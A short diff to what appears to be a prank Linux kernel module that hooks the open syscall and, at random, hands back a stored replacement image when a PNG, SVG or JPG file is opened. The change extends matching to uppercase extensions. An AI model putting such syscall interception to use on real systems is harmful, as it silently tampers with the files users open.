@@ -67,13 +67,13 @@ static bool to_doot_or_not_to_doot(void) {
 asmlinkage long doot_open(const char __user *filename, int flags, umode_t mode)
 {
     if (to_doot_or_not_to_doot()) {
-        if (filecmp(filename, ".png")) {
+        if (filecmp(filename, ".png") || filecmp(filename, ".PNG")) {
             LOG_DOOT;
             return get_fd(doot_png, flags, mode);
-        } else if (filecmp(filename, ".svg")) {
+        } else if (filecmp(filename, ".svg") || filecmp(filename, ".SVG")) {
             LOG_DOOT;
             return get_fd(doot_svg, flags, mode);
-        } else if (filecmp(filename, ".jpg")) {
+        } else if (filecmp(filename, ".jpg") || filecmp(filename, ".JPG")) {
             LOG_DOOT;
             return get_fd(doot_jpg, flags, mode);
         }
